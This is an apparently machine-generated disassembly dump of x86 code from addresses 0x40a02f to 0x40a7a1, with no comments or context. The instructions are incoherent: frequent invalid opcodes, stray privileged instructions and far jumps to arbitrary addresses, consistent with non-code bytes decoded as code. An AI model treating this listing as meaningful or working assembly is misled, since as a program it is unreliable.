  40a02f:	idiv   BYTE PTR [eax+edi*2]
  40a032:	push   cs
  40a033:	test   al,0xaa
  40a035:	xlat   BYTE PTR ds:[ebx]
  40a036:	xor    BYTE PTR [ecx],0xfe
  40a039:	outs   dx,DWORD PTR ds:[esi]
  40a03a:	icebp  
  40a03b:	clc    
  40a03c:	add    eax,ecx
  40a03e:	or     al,0x4f
  40a040:	pop    esi
  40a041:	aad    0x14
  40a043:	cmp    eax,0xb392c48d
  40a048:	mov    edx,0x4fffe55c
  40a04d:	sahf   
  40a04e:	mov    bl,0x79
  40a050:	or     BYTE PTR [ecx+0x76418e83],0x32
  40a057:	pop    ecx
  40a058:	mov    edi,0x5979522
  40a05d:	lahf   
  40a05e:	mov    ch,0xcf
  40a060:	popa   
  40a061:	into   
  40a062:	(bad)
  40a065:	cdq    
  40a066:	sbb    edx,DWORD PTR [ecx+0x5f6cadb6]
  40a06c:	outs   dx,DWORD PTR ds:[esi]
  40a06d:	sbb    esp,DWORD PTR [eax]
  40a06f:	call   0x8505:0x14d2c34f
  40a076:	push   esp
  40a077:	dec    ecx
  40a078:	ror    ebp,1
  40a07a:	add    ch,dh
  40a07c:	inc    edx
  40a07d:	sub    al,0xe6
  40a07f:	leave  
  40a080:	shr    bl,0x5
  40a083:	stc    
  40a084:	(bad)  
  40a085:	loope  0x40a0bf
  40a087:	stos   DWORD PTR es:[edi],eax
  40a088:	xchg   ebx,eax
  40a089:	ds cwde 
  40a08b:	sbb    al,0x49
  40a08d:	mov    eax,ds:0x916cb636
  40a092:	adc    DWORD PTR [ebp-0x23b2d6ba],0x2f
  40a099:	sub    BYTE PTR [ecx+edi*8],al
  40a09c:	ins    BYTE PTR es:[edi],dx
  40a09d:	jecxz  0x40a064
  40a09f:	jge    0x40a0c4
  40a0a1:	add    al,0x71
  40a0a3:	sub    bl,bl
  40a0a5:	or     al,0x26
  40a0a7:	cwde   
  40a0a8:	jle    0x40a101
  40a0aa:	icebp  
  40a0ab:	cmp    eax,0x4740db0f
  40a0b0:	lea    ecx,[ebx-0x4c9f49d8]
  40a0b6:	adc    edi,edx
  40a0b8:	sub    eax,0xbbc63e4f
  40a0bd:	arpl   WORD PTR [esi],cx
  40a0bf:	push   esi
  40a0c0:	jno    0x40a045
  40a0c2:	mov    ch,0x3a
  40a0c4:	outs   dx,DWORD PTR ds:[esi]
  40a0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c6:	mov    ch,0x3e
  40a0c8:	rcr    BYTE PTR [edi-0x4f8b63c7],cl
  40a0ce:	pushw  ds
  40a0d0:	mov    ebx,ebx
  40a0d2:	xchg   dh,al
  40a0d4:	xchg   DWORD PTR [edi],eax
  40a0d6:	add    ah,BYTE PTR [ebp-0x2]
  40a0d9:	ret    
  40a0da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0db:	mov    edi,fs
  40a0dd:	push   esp
  40a0de:	(bad)  
  40a0df:	xchg   edi,eax
  40a0e0:	push   es
  40a0e1:	jl     0x40a072
  40a0e3:	cmp    al,0x8d
  40a0e5:	jmp    0x5ebc9c6d
  40a0ea:	mov    edx,0x2d707852
  40a0ef:	push   0xaa1b6b0
  40a0f4:	outs   dx,BYTE PTR ds:[esi]
  40a0f5:	push   eax
  40a0f6:	cld    
  40a0f7:	leave  
  40a0f8:	ins    DWORD PTR es:[edi],dx
  40a0f9:	and    BYTE PTR ds:0x781a,al
  40a0fe:	add    eax,ebp
  40a100:	push   ecx
  40a101:	or     eax,DWORD PTR [ecx+ebp*2]
  40a104:	enter  0xa3a6,0xc
  40a108:	mov    cs,WORD PTR [ebp+0x6b]
  40a10b:	mov    al,0x43
  40a10d:	in     eax,dx
  40a10e:	or     esi,edi
  40a110:	and    al,0x72
  40a112:	sub    ecx,edi
  40a114:	push   edi
  40a115:	add    eax,0x9aa6d4c6
  40a11a:	clc    
  40a11b:	push   0x5a
  40a11d:	and    DWORD PTR [ecx+0x4efa8c9e],0xfffffff8
  40a124:	in     eax,0xb6
  40a126:	repnz outs dx,BYTE PTR ds:[esi]
  40a128:	add    BYTE PTR [edi+0x7],cl
  40a12b:	imul   ebx,DWORD PTR [ebx-0x27],0x51
  40a12f:	(bad)  
  40a130:	fist   WORD PTR [edi]
  40a132:	cmp    al,0x69
  40a134:	mov    ebx,0x59a34ec1
  40a139:	mov    cl,0xf7
  40a13b:	outs   dx,DWORD PTR ds:[esi]
  40a13c:	fdivrp st(5),st
  40a13e:	icebp  
  40a13f:	das    
  40a140:	mov    ds:0xe203f444,eax
  40a145:	popa   
  40a146:	sbb    ah,BYTE PTR [ecx-0x6a882837]
  40a14c:	xlat   BYTE PTR ds:[ebx]
  40a14d:	mov    al,ds:0xdd02367e
  40a152:	push   0x73
  40a154:	scas   al,BYTE PTR es:[edi]
  40a155:	aaa    
  40a156:	mov    dl,BYTE PTR [ecx-0x53]
  40a159:	cmp    cl,BYTE PTR [ecx]
  40a15b:	sbb    al,0x12
  40a15d:	xchg   BYTE PTR [ecx+0x57],al
  40a160:	rcr    DWORD PTR ds:0x3ac3b36,1
  40a166:	jne    0x40a1b2
  40a168:	xchg   DWORD PTR [edi+0x1e],edi
  40a16b:	call   0xf0f5:0x8db6f9e7
  40a172:	push   cs
  40a173:	fbld   TBYTE PTR [esi]
  40a175:	dec    ebx
  40a176:	(bad)  
  40a177:	in     eax,0x52
  40a179:	outs   dx,BYTE PTR ds:[esi]
  40a17a:	mov    DWORD PTR [edx+0x6be6a1f8],edx
  40a180:	mov    ecx,0x3802938
  40a185:	adc    DWORD PTR [ebp-0x3f],eax
  40a188:	pop    eax
  40a189:	cmp    DWORD PTR [edx+0x17],edi
  40a18c:	loop   0x40a1a2
  40a18e:	lahf   
  40a18f:	adc    BYTE PTR [esi-0x53],0x66
  40a193:	mov    esi,0xe5204389
  40a198:	mov    ds:0x614f8c3a,al
  40a19d:	or     DWORD PTR [esi+0x275bc7a4],ebp
  40a1a3:	pop    ebx
  40a1a4:	mov    ?,WORD PTR [edi+0x3b808e1]
  40a1aa:	in     eax,0xed
  40a1ac:	fiadd  DWORD PTR gs:[ecx-0x60]
  40a1b0:	mov    esi,0xa4de2a79
  40a1b5:	mov    ds:0x4b7d3b4f,al
  40a1ba:	add    esi,ebx
  40a1bc:	or     esi,esp
  40a1be:	ds adc esp,esp
  40a1c1:	inc    edi
  40a1c2:	sbb    eax,0x72b537ea
  40a1c7:	push   0xffffffc6
  40a1c9:	sub    al,0x71
  40a1cb:	pop    ds
  40a1cc:	pop    ds
  40a1cd:	inc    esp
  40a1ce:	neg    BYTE PTR [esi-0x2d]
  40a1d1:	adc    ecx,DWORD PTR [ebx+0x72d2a7fe]
  40a1d7:	retf   
  40a1d8:	xchg   ebx,eax
  40a1d9:	sub    DWORD PTR [ecx],0x60
  40a1dc:	xor    al,0x1b
  40a1de:	scas   al,BYTE PTR es:[edi]
  40a1df:	vsqrtss xmm0,xmm3,DWORD PTR [esi-0x4e89a74e]
  40a1e7:	(bad)  
  40a1e8:	adc    al,0x97
  40a1ea:	dec    edx
  40a1eb:	dec    ebp
  40a1ec:	sub    eax,0x5d6d3b12
  40a1f1:	sub    eax,DWORD PTR [edi-0x67]
  40a1f4:	push   0x3c
  40a1f6:	or     cl,BYTE PTR [ecx]
  40a1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f9:	push   ds
  40a1fa:	out    dx,eax
  40a1fb:	or     eax,0xd3fbfee0
  40a200:	xchg   esp,eax
  40a201:	mov    al,0x71
  40a203:	das    
  40a204:	jg     0x40a1ad
  40a206:	adc    al,0x76
  40a208:	mov    dl,0xe6
  40a20a:	outs   dx,WORD PTR ds:[esi]
  40a20c:	dec    edx
  40a20d:	je     0x40a265
  40a20f:	sahf   
  40a210:	loopne 0x40a284
  40a212:	xor    ch,BYTE PTR [ebx-0x2220fe36]
  40a218:	aad    0x30
  40a21a:	cmp    BYTE PTR [edx+0x25],cl
  40a21d:	inc    eax
  40a21e:	xor    ebp,esp
  40a220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a221:	pop    es
  40a222:	imul   DWORD PTR [ebp+0x4959da1f]
  40a228:	(bad)  
  40a229:	cmp    BYTE PTR [edx],cl
  40a22b:	jns    0x40a28a
  40a22d:	sub    edx,DWORD PTR [edi]
  40a22f:	inc    ecx
  40a230:	pop    ecx
  40a231:	sub    bh,cl
  40a233:	imul   ecx,DWORD PTR [esi+0x72703dc4],0xad711f7b
  40a23d:	cmp    eax,0xdab7b415
  40a242:	jg     0x40a278
  40a244:	push   ecx
  40a245:	adc    edx,0x3
  40a248:	cmp    BYTE PTR [ebp-0x700a76a1],ch
  40a24e:	test   DWORD PTR [eax+0x47],0x5ed2c643
  40a255:	xor    DWORD PTR [edi],esi
  40a257:	(bad)  
  40a258:	mov    ebx,0x867641db
  40a25d:	push   edi
  40a25e:	add    ch,0x39
  40a261:	dec    eax
  40a262:	sar    DWORD PTR [edi+ebx*4+0x77df7003],1
  40a269:	ficom  WORD PTR [esi]
  40a26b:	mov    ah,0x6d
  40a26d:	and    DWORD PTR [edx],edi
  40a26f:	adc    ebx,DWORD PTR [esi-0x33]
  40a272:	adc    eax,0x1be9740d
  40a277:	xchg   dh,al
  40a279:	xchg   BYTE PTR [ebx+0x6546f27],al
  40a27f:	xlat   BYTE PTR ds:[ebx]
  40a280:	inc    esp
  40a281:	xor    al,0x90
  40a283:	add    cl,BYTE PTR [ebp+0x3643de35]
  40a289:	adc    cl,bh
  40a28b:	sbb    al,0xc0
  40a28d:	jle    0x40a26b
  40a28f:	and    bh,BYTE PTR [edi+0x61a1bce1]
  40a295:	mov    ch,0xeb
  40a297:	xor    esp,DWORD PTR [eax+esi*4-0x69075078]
  40a29e:	dec    edi
  40a29f:	add    al,0x6
  40a2a1:	pop    edx
  40a2a2:	xchg   edx,eax
  40a2a3:	pop    eax
  40a2a4:	and    dl,BYTE PTR [ecx]
  40a2a6:	daa    
  40a2a7:	push   ebx
  40a2a8:	daa    
  40a2a9:	jne    0x40a318
  40a2ab:	and    BYTE PTR [ecx-0x7a],ch
  40a2ae:	sbb    al,0xb
  40a2b0:	call   0xa92:0x1007f786
  40a2b7:	cwde   
  40a2b8:	xor    DWORD PTR [edx+0x12],edi
  40a2bb:	xor    DWORD PTR [edx+ebp*2+0x597fc1f7],eax
  40a2c2:	adc    eax,0x77503728
  40a2c7:	push   edi
  40a2c8:	mov    bh,0x6e
  40a2ca:	or     eax,esi
  40a2cc:	jno    0x40a287
  40a2ce:	out    dx,eax
  40a2cf:	jmp    0x40a33d
  40a2d1:	mov    edi,0xa4ac9f2c
  40a2d6:	stc    
  40a2d7:	pop    ss
  40a2d8:	adc    al,0xc
  40a2da:	push   DWORD PTR [ebp+0x71]
  40a2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2de:	test   al,0x71
  40a2e0:	sbb    al,0xcb
  40a2e2:	sahf   
  40a2e3:	push   edx
  40a2e4:	cmp    BYTE PTR [si-0x2744],ch
  40a2e9:	iret   
  40a2ea:	hlt    
  40a2eb:	loope  0x40a2a4
  40a2ed:	push   esi
  40a2ee:	push   edx
  40a2ef:	inc    ebx
  40a2f0:	call   0xa713:0xd1530572
  40a2f7:	push   cs
  40a2f8:	aaa    
  40a2f9:	sahf   
  40a2fa:	mov    edi,0x5b7be468
  40a2ff:	jno    0x40a2d2
  40a301:	scas   al,BYTE PTR es:[edi]
  40a302:	jnp    0x40a2d6
  40a304:	push   eax
  40a305:	mov    dl,0x91
  40a307:	cmp    BYTE PTR [esi],dl
  40a309:	cmp    DWORD PTR [ebx],esp
  40a30b:	jb     0x40a2bb
  40a30d:	or     dl,BYTE PTR ds:0x595e3f9e
  40a313:	les    edx,FWORD PTR [eax-0x3d]
  40a316:	ins    DWORD PTR es:[edi],dx
  40a317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a318:	mov    esp,0xeef23ec6
  40a31d:	pop    edx
  40a31e:	push   esp
  40a31f:	fdivrp st(3),st
  40a321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a322:	pop    ebx
  40a323:	mov    eax,0x8b3444f0
  40a328:	cmc    
  40a329:	ss mov ch,0xa7
  40a32c:	xor    eax,0x5a4d8e1e
  40a331:	jecxz  0x40a377
  40a333:	jmp    0x29dab547
  40a338:	pop    ecx
  40a339:	adc    BYTE PTR [ecx],ah
  40a33b:	xchg   BYTE PTR fs:[ebp-0x4f1a2069],bl
  40a342:	sar    esi,0x3a
  40a345:	xchg   ecx,eax
  40a346:	scas   eax,DWORD PTR es:[edi]
  40a347:	in     al,dx
  40a348:	jle    0x40a39d
  40a34a:	push   ebx
  40a34b:	and    dl,BYTE PTR [ebx-0x1d]
  40a34e:	ret    
  40a34f:	inc    esp
  40a350:	cmc    
  40a351:	push   ds
  40a352:	and    DWORD PTR [eax],0xffffffa7
  40a355:	jo     0x40a340
  40a357:	cmp    al,0x46
  40a359:	mov    ds:0xd3ce2b22,al
  40a35e:	adc    edi,ecx
  40a360:	out    dx,al
  40a361:	iret   
  40a362:	stc    
  40a363:	ins    DWORD PTR es:[edi],dx
  40a364:	imul   edx,DWORD PTR [ecx],0x579dc8c1
  40a36a:	jbe    0x40a365
  40a36c:	xchg   ecx,eax
  40a36d:	mov    edi,0xb55782fd
  40a372:	adc    bl,BYTE PTR [ebp+0x14995137]
  40a378:	dec    ebp
  40a379:	ins    DWORD PTR es:[edi],dx
  40a37a:	pop    edi
  40a37b:	enter  0x933,0x8d
  40a37f:	jg     0x40a366
  40a381:	(bad)
  40a385:	push   edi
  40a386:	fcomp  DWORD PTR [eax-0x3366a9b2]
  40a38c:	adc    al,0x32
  40a38e:	ds ret 0xc38f
  40a392:	push   ecx
  40a393:	int    0x21
  40a395:	jge    0x40a325
  40a397:	sbb    eax,edx
  40a399:	cmp    ebx,ecx
  40a39b:	jl     0x40a3d5
  40a39d:	nop
  40a39e:	ins    BYTE PTR es:[edi],dx
  40a39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a0:	clc    
  40a3a1:	test   eax,ecx
  40a3a3:	jno    0x40a424
  40a3a5:	lods   eax,DWORD PTR ds:[esi]
  40a3a6:	or     DWORD PTR [eax-0x69],ebx
  40a3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3aa:	call   0xb6c9:0xc085652b
  40a3b1:	pop    ecx
  40a3b2:	inc    esi
  40a3b3:	or     al,BYTE PTR [edi-0x76]
  40a3b6:	sbb    ecx,DWORD PTR [ebp+0x30]
  40a3b9:	shl    DWORD PTR [edi],cl
  40a3bb:	sbb    edi,DWORD PTR [esi+0x30]
  40a3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3bf:	inc    ebx
  40a3c0:	jbe    0x40a43d
  40a3c2:	in     eax,dx
  40a3c3:	sub    BYTE PTR [edi+0x1f80164c],ah
  40a3c9:	jp     0x40a3b5
  40a3cb:	arpl   WORD PTR [ecx],ax
  40a3cd:	out    0x3,al
  40a3cf:	adc    eax,0x1a0dc3ea
  40a3d4:	xlat   BYTE PTR ds:[ebx]
  40a3d5:	and    esp,DWORD PTR ds:0x1d5a6275
  40a3db:	jmp    0xfe2d1045
  40a3e0:	inc    eax
  40a3e1:	in     eax,0xf8
  40a3e3:	leave  
  40a3e4:	popa   
  40a3e5:	sub    al,BYTE PTR [esi-0x28effbe]
  40a3eb:	mov    DWORD PTR [edx],0x190b3b7d
  40a3f1:	jae    0x40a383
  40a3f3:	sub    esp,DWORD PTR [esi+0x6a]
  40a3f6:	xchg   ebp,eax
  40a3f7:	rcl    BYTE PTR [ebx+edx*2],cl
  40a3fa:	cmp    DWORD PTR [edx+eax*1],ebx
  40a3fd:	(bad)  
  40a3fe:	int3   
  40a3ff:	ja     0x40a3ce
  40a401:	mov    ds:0xf813ebbf,al
  40a406:	xor    ebp,DWORD PTR [edx+0x2ba7a039]
  40a40c:	adc    eax,0xc533027d
  40a411:	push   ds
  40a412:	push   cs
  40a413:	(bad)  
  40a414:	dec    edi
  40a415:	sbb    ebp,DWORD PTR [ecx+eiz*1]
  40a418:	and    bl,dl
  40a41a:	sahf   
  40a41b:	call   0xbd8432c2
  40a420:	add    ebx,ebx
  40a422:	jbe    0x40a3d7
  40a424:	pop    ds
  40a425:	dec    edi
  40a426:	outs   dx,BYTE PTR ds:[esi]
  40a427:	sub    dh,BYTE PTR [edi-0x68]
  40a42a:	fwait
  40a42b:	cwde   
  40a42c:	aad    0x50
  40a42e:	push   ebx
  40a42f:	xchg   edx,eax
  40a430:	lea    edi,[eax-0x46]
  40a433:	jmp    0x11b90c3b
  40a438:	aas    
  40a439:	mov    edx,DWORD PTR [ecx]
  40a43b:	jne    0x40a3e7
  40a43d:	and    al,0x11
  40a43f:	xor    edi,eax
  40a441:	mov    ch,ah
  40a443:	sub    cl,cl
  40a445:	inc    dh
  40a447:	pop    ebx
  40a448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a449:	ss jae 0x40a479
  40a44c:	jbe    0x40a419
  40a44e:	jnp    0x40a421
  40a450:	adc    esp,edi
  40a452:	mov    ecx,0x24cec91f
  40a457:	into   
  40a458:	or     esp,DWORD PTR [ecx-0xf9eb429]
  40a45e:	adc    DWORD PTR [esi-0x53],esp
  40a461:	mov    BYTE PTR [ebx-0x5c],bl
  40a464:	push   esp
  40a465:	cld    
  40a466:	ins    DWORD PTR es:[edi],dx
  40a467:	add    eax,0x1807fa06
  40a46c:	pop    edi
  40a46d:	mov    DWORD PTR [edx+0x29548dab],esp
  40a473:	adc    esp,DWORD PTR [ebx-0x1]
  40a476:	sbb    dl,BYTE PTR [edx-0x80]
  40a479:	out    dx,al
  40a47a:	cmc    
  40a47b:	fndisi(8087 only) 
  40a47d:	es inc edx
  40a47f:	call   0x8f7a2174
  40a484:	or     BYTE PTR [edi+edi*2+0x52e63830],dh
  40a48b:	dec    eax
  40a48c:	mov    eax,0x43c60b34
  40a491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a492:	loop   0x40a466
  40a494:	inc    edi
  40a495:	dec    ecx
  40a496:	xchg   esp,eax
  40a497:	sub    BYTE PTR [eax],0x8c
  40a49a:	data16 aad 0xc5
  40a49d:	mov    dl,0x60
  40a49f:	cmp    edi,DWORD PTR [esi-0x7ed2e97a]
  40a4a5:	mov    bl,0x52
  40a4a7:	sar    esi,1
  40a4a9:	retf   0xd4cd
  40a4ac:	cld    
  40a4ad:	sub    BYTE PTR [ebx],0x93
  40a4b0:	pop    esi
  40a4b1:	mov    DWORD PTR [edi+edx*1-0x67],esi
  40a4b5:	inc    ebp
  40a4b6:	data16 and al,0xdd
  40a4b9:	jmp    0x40a46b
  40a4bb:	mov    eax,esp
  40a4bd:	dec    edi
  40a4be:	mov    ds:0xc06422d2,eax
  40a4c3:	cmc    
  40a4c4:	cli    
  40a4c5:	es fwait
  40a4c7:	sub    ebp,DWORD PTR [ecx]
  40a4c9:	retf   0xaf5b
  40a4cc:	(bad)  
  40a4cd:	ret    0x3be8
  40a4d0:	jmp    0xe6935e9
  40a4d5:	xor    eax,0x93588541
  40a4da:	xor    eax,0x5cca404c
  40a4df:	loopne 0x40a4e3
  40a4e1:	ja     0x40a4a3
  40a4e3:	inc    eax
  40a4e4:	push   es
  40a4e5:	xor    BYTE PTR [ecx-0x77d365b9],dl
  40a4eb:	loope  0x40a568
  40a4ed:	mov    bh,0x8c
  40a4ef:	nop
  40a4f0:	xor    ecx,DWORD PTR [ebx]
  40a4f2:	sbb    BYTE PTR ds:0x7c42add0,0x67
  40a4f9:	call   0x50ccb254
  40a4fe:	dec    ecx
  40a4ff:	test   DWORD PTR [edx-0x14552b1],0x767e0e72
  40a509:	mov    bl,0x71
  40a50b:	out    0xd1,eax
  40a50d:	inc    edx
  40a50e:	dec    ebp
  40a50f:	sub    BYTE PTR [eax-0xc64961e],0xfb
  40a516:	out    dx,al
  40a517:	stos   BYTE PTR es:[edi],al
  40a518:	push   esp
  40a519:	mov    eax,ds:0xb3235736
  40a51e:	scas   al,BYTE PTR es:[edi]
  40a51f:	addr16 mov dh,0x9a
  40a522:	aas    
  40a523:	call   0x2b00d8f
  40a528:	sub    al,0xda
  40a52a:	pop    edx
  40a52b:	dec    ebx
  40a52c:	das    
  40a52d:	(bad)  
  40a52e:	mov    esi,0xbdb12857
  40a533:	clc    
  40a534:	mov    eax,ds:0x85f769c6
  40a539:	mov    ebp,0xa9543b61
  40a53e:	dec    esp
  40a53f:	inc    esp
  40a540:	mov    ds:0xe1b202e3,al
  40a545:	(bad)  
  40a546:	or     DWORD PTR ds:0x66ac235d,ebx
  40a54c:	mov    dl,0x95
  40a54e:	xor    esi,ebx
  40a550:	(bad)  
  40a551:	jge    0x40a52e
  40a553:	and    DWORD PTR [ebx],eax
  40a555:	cmp    dh,al
  40a557:	or     ah,BYTE PTR [esi]
  40a559:	fdecstp 
  40a55b:	enter  0xc4d9,0x4a
  40a55f:	outs   dx,BYTE PTR ds:[esi]
  40a560:	pop    ecx
  40a561:	add    eax,DWORD PTR ds:0x36d5f0f4
  40a567:	pushf  
  40a568:	sbb    BYTE PTR [ebp-0xbe81775],0x17
  40a56f:	dec    ebx
  40a570:	enter  0x5fa8,0x45
  40a574:	int3   
  40a575:	add    bl,0x6e
  40a578:	gs mov esp,0xb7070439
  40a57e:	popf   
  40a57f:	(bad)  
  40a580:	mov    esp,0x1e2ebf71
  40a585:	sbb    DWORD PTR [ebx-0x5f],0xc05a2fc7
  40a58c:	iret   
  40a58d:	dec    esp
  40a58e:	ret    
  40a58f:	test   al,0x89
  40a591:	push   edi
  40a592:	jge    0x40a5e5
  40a594:	scas   eax,DWORD PTR es:[edi]
  40a595:	sbb    BYTE PTR [ebp-0x4d],0xe
  40a599:	xchg   edi,eax
  40a59a:	pop    edi
  40a59b:	or     ecx,edx
  40a59d:	jmp    0x40a604
  40a59f:	dec    DWORD PTR [esi]
  40a5a1:	inc    ebp
  40a5a2:	clc    
  40a5a3:	xchg   edi,eax
  40a5a4:	popf   
  40a5a5:	pop    ebp
  40a5a6:	dec    edi
  40a5a7:	jmp    0xa2e7:0x2b7763a7
  40a5ae:	test   DWORD PTR [ebx],0x979bbc22
  40a5b4:	xor    eax,0x176c8c71
  40a5b9:	xchg   eax,esi
  40a5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5bc:	gs jecxz 0x40a5e3
  40a5bf:	lods   eax,DWORD PTR ds:[esi]
  40a5c0:	stos   DWORD PTR es:[edi],eax
  40a5c1:	pusha  
  40a5c2:	les    ebx,FWORD PTR [ecx-0x78]
  40a5c5:	mov    bl,0xd5
  40a5c7:	cs sub eax,0x9411baba
  40a5cd:	jmp    0x9fd4422e
  40a5d2:	xor    eax,DWORD PTR [eax-0x684b3dac]
  40a5d8:	jge    0x40a614
  40a5da:	and    esi,DWORD PTR ds:0x9173033f
  40a5e0:	jno    0x40a630
  40a5e2:	mov    dh,0x2a
  40a5e4:	xor    DWORD PTR [edi+0x38204119],esp
  40a5ea:	call   0xf479dd3a
  40a5ef:	fnstcw WORD PTR [ebx-0x7d]
  40a5f2:	aad    0x41
  40a5f4:	or     cl,BYTE PTR [edx]
  40a5f6:	cmp    BYTE PTR ds:0x50eda15c,0x22
  40a5fd:	ret    
  40a5fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ff:	call   0x495c:0xeeb2fb36
  40a606:	push   0xffffffa3
  40a608:	stos   BYTE PTR es:[edi],al
  40a609:	jbe    0x40a5e1
  40a60b:	mov    WORD PTR [ecx-0xa],ds
  40a60e:	and    cl,BYTE PTR [edi]
  40a610:	push   0x19
  40a612:	out    dx,eax
  40a613:	mov    ds:0xdfbb2ca7,eax
  40a618:	and    DWORD PTR [ebx],ebp
  40a61a:	int3   
  40a61b:	loopne 0x40a69c
  40a61d:	(bad)
  40a620:	or     BYTE PTR [eax],cl
  40a622:	sbb    eax,0xdacb6dd4
  40a627:	rsm    
  40a629:	and    edx,DWORD PTR [esp+ebx*2]
  40a62c:	jp     0x40a657
  40a62e:	xchg   esp,eax
  40a62f:	or     DWORD PTR [ebp-0x70763bb6],0x67644f6d
  40a639:	jp     0x40a687
  40a63b:	out    0xc9,eax
  40a63d:	pop    ebp
  40a63e:	xchg   ebx,eax
  40a63f:	mov    eax,DWORD PTR [eax+edx*8+0x42]
  40a643:	sbb    al,0xa4
  40a645:	jp     0x40a67d
  40a647:	loop   0x40a627
  40a649:	and    eax,0x53966578
  40a64e:	shld   DWORD PTR [esi],ebx,0x64
  40a652:	jo     0x40a6bf
  40a654:	test   eax,0x6de23ae0
  40a659:	aad    0x9f
  40a65b:	in     eax,dx
  40a65c:	popa   
  40a65d:	shl    DWORD PTR [ecx+0x197040dd],1
  40a663:	(bad)  
  40a664:	adc    BYTE PTR [ecx+0x69],al
  40a667:	add    bh,BYTE PTR [edi]
  40a669:	test   eax,0x7e61e02a
  40a66e:	fldcw  WORD PTR [edx+0x24cba6ce]
  40a674:	arpl   WORD PTR [ebx+0x5b],cx
  40a677:	cmc    
  40a678:	mov    dh,0xf7
  40a67a:	push   0xffffff8f
  40a67c:	pop    ss
  40a67d:	popf   
  40a67e:	lods   al,BYTE PTR ds:[esi]
  40a67f:	mov    DWORD PTR [eax],esi
  40a681:	push   ecx
  40a682:	mov    al,ds:0xa680b956
  40a687:	xor    bl,BYTE PTR [esi]
  40a689:	push   ebp
  40a68a:	pop    ebx
  40a68b:	push   ebx
  40a68c:	mov    DWORD PTR [ebx-0x1c],esp
  40a68f:	dec    edi
  40a690:	pop    ecx
  40a691:	pusha  
  40a692:	adc    eax,0x7b20014a
  40a697:	mov    ch,0x9
  40a699:	mov    dl,0xb
  40a69b:	mov    ebp,0x55a451ba
  40a6a0:	outs   dx,BYTE PTR ds:[esi]
  40a6a1:	add    esi,ebx
  40a6a3:	in     al,0xae
  40a6a5:	push   0xffffff8c
  40a6a7:	cmp    eax,0x553d7b3f
  40a6ac:	test   eax,0x7348f9bc
  40a6b1:	test   BYTE PTR [ebp-0x5f],ch
  40a6b4:	xchg   edx,eax
  40a6b5:	jns    0x40a71d
  40a6b7:	js     0x40a656
  40a6b9:	mov    bl,bh
  40a6bb:	lock iret 
  40a6bd:	bound  esp,QWORD PTR [ebx+0x2e]
  40a6c0:	dec    edx
  40a6c1:	inc    ebx
  40a6c2:	jmp    0x40a677
  40a6c4:	push   esp
  40a6c5:	jmp    0x40a685
  40a6c7:	lahf   
  40a6c8:	dec    edi
  40a6c9:	push   cs
  40a6ca:	xchg   edx,eax
  40a6cb:	ss push 0x41750691
  40a6d1:	ret    0x1e2b
  40a6d4:	pop    ecx
  40a6d5:	and    DWORD PTR [esi+esi*8],edi
  40a6d8:	jge    0x40a72d
  40a6da:	loope  0x40a661
  40a6dc:	retf   
  40a6dd:	mov    bl,0xd8
  40a6df:	mov    BYTE PTR [eax-0x3d],al
  40a6e2:	(bad)  
  40a6e3:	pop    edi
  40a6e4:	sub    al,0xcc
  40a6e6:	mov    al,0x96
  40a6e8:	push   ecx
  40a6e9:	or     DWORD PTR [eax+0x12],eax
  40a6ec:	xchg   edi,eax
  40a6ed:	hlt    
  40a6ee:	lods   eax,DWORD PTR ds:[esi]
  40a6ef:	xchg   edi,eax
  40a6f0:	cli    
  40a6f1:	push   ecx
  40a6f2:	sti    
  40a6f3:	adc    eax,0x43ec876d
  40a6f8:	ret    
  40a6f9:	icebp  
  40a6fa:	mov    esi,0xea01b0
  40a6ff:	out    0xf4,eax
  40a701:	shl    DWORD PTR [ebx-0x2c4365e5],cl
  40a707:	cmp    al,0xc9
  40a709:	in     eax,0xc5
  40a70b:	add    DWORD PTR [ebp-0x1601ed23],edi
  40a711:	lea    ebx,ds:0x72750380
  40a717:	inc    eax
  40a718:	pushf  
  40a719:	inc    ebx
  40a71a:	inc    edx
  40a71b:	add    dl,BYTE PTR ds:0x276c3c1e
  40a721:	call   0x9b4913d7
  40a726:	mov    al,ds:0xa85aff6
  40a72b:	in     al,0x48
  40a72d:	cmp    DWORD PTR [esi-0x11],edx
  40a730:	mov    edi,0xc589e9ed
  40a735:	mov    DWORD PTR ds:[edi],0x5c4d3a5
  40a73c:	mov    ebp,0x6c19b1f0
  40a741:	push   0xea51ad5d
  40a746:	jle    0x40a742
  40a748:	add    cl,0xf0
  40a74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74c:	inc    eax
  40a74d:	sub    al,0xc3
  40a74f:	mov    ch,BYTE PTR [ebp-0x6aa6a71a]
  40a755:	fistp  QWORD PTR [esp+edi*4]
  40a758:	cmp    BYTE PTR [ebx-0x69aeb189],cl
  40a75e:	iret   
  40a75f:	jmp    0xe543:0xa5f68ff9
  40a766:	inc    edi
  40a767:	je     0x40a7d2
  40a769:	xchg   ebx,eax
  40a76a:	outs   dx,DWORD PTR ds:[esi]
  40a76b:	dec    ebp
  40a76c:	out    dx,eax
  40a76d:	mov    WORD PTR ds:0x4f6191a1,ds
  40a773:	mov    esi,0x1b1c1162
  40a778:	push   ss
  40a779:	inc    ebx
  40a77a:	push   ds
  40a77b:	(bad)  
  40a77d:	ret    0xcb02
  40a780:	(bad)  
  40a781:	sub    BYTE PTR [edx+esi*2-0x54],cl
  40a785:	mov    esi,0xd26f306f
  40a78a:	mov    esp,0xcea824dc
  40a78f:	aam    0x5f
  40a791:	pop    es
  40a792:	jne    0x40a786
  40a794:	adc    bl,BYTE PTR [edi-0x6e06fc5a]
  40a79a:	out    0x57,al
  40a79c:	or     al,0x20
  40a79e:	push   edi
  40a79f:	mov    cl,0xbf
  40a7a1:	into   
